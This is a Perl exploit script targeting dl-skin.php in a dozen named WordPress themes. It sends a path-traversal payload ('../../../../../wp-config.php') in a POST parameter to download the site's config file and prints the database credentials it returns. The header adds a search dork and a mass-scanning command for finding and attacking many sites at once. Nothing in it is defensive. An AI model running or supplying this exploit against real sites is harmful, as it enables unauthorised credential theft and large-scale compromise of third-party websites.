#!/usr/bin/perl
############################################
############################################
## WORDPRESS Get Config dl-skin.php Exploit
## CODED BY ZaiTsev
## ZaiTsev
############################################
##  VULNERABLE THEMES:
##     wp-content/themes/awake/
##     wp-content/themes/elegance/
##     wp-content/themes/barracudafx/
##     wp-content/themes/fusion/
##     wp-content/themes/dejavu/
##     wp-content/themes/infocus/
##     wp-content/themes/Minamaze_Pro/
##     wp-content/themes/Melos_Pro/
##     wp-content/themes/versatile/
##     wp-content/themes/construct/
##     wp-content/themes/persuasion/
##     wp-content/themes/mesocolumn/  
##   [+][+]  
##   USAGE: 
##     perl WP-dl-skin-exploit.pl http://site.com/wp-content/themes/THEME NAME/lib/scripts/dl-skin.php
##   [+][+]
##   ATSCAN MASS USAGE:
##   atscan -d 'index of /lib/scripts/dl-skin.php' -m 2 -l 10 --command "perl WP-dl-skin-exploit.pl --TARGET" 

## DORKS
## DORK: index of /lib/scripts/dl-skin.php
############################################
############################################
use strict;
use warnings;
use FindBin '$Bin';
use Term::ANSIColor;
use URI::Escape;
use HTML::Entities;
use LWP::UserAgent;
print color 'reset';
print "
      [+]================================================================[+]
      [+]--------- Wordpress Get Config ------------ Exploit  -----------[+]
      [+]-------------------          ZaiTsev         -------------------[+]
      [+]---------------https://www.facebook.com/ZaiTsevMosad------------[+]
      [+]------------ https://www.facebook.com/ZaiTsevMosad  ------------[+]
      [+]-- https://www.youtube.com/channel/UCrkLvfHyQEvP9pcD1krekCw  ---[+]
      [+]================================================================[+]
";

if (!$ARGV[0]) { print "Usage: php WP-dl-skin.php-exploit.php http://www.site.com/wp-content/themes/THEME NAME/....\n"; exit; }
my $ua = LWP::UserAgent->new;
$ua->timeout(10);
my $URL=$ARGV[0];
my @error=("Target Vulnerable", "Target Not vulnerable");
$URL=~s/scripts\/(.*)//s;
$URL=$URL."scripts/dl-skin.php";
print "      SCAN   : ";
use HTTP::Request::Common;
$ua = LWP::UserAgent->new;
my $response=$ua->request(POST $URL, ['Content_Type' => 'form-data', '_mysite_download_skin' => '../../../../../wp-config.php']);
if ($response->content=~/DB_NAME/) {
  print color 'green'; print "$error[0]\n";
  print color 'green'; print $response->content."\n";
  print color 'reset';
}else{
  print color 'red'; print "$error[1]\n";
  print color 'reset';
}
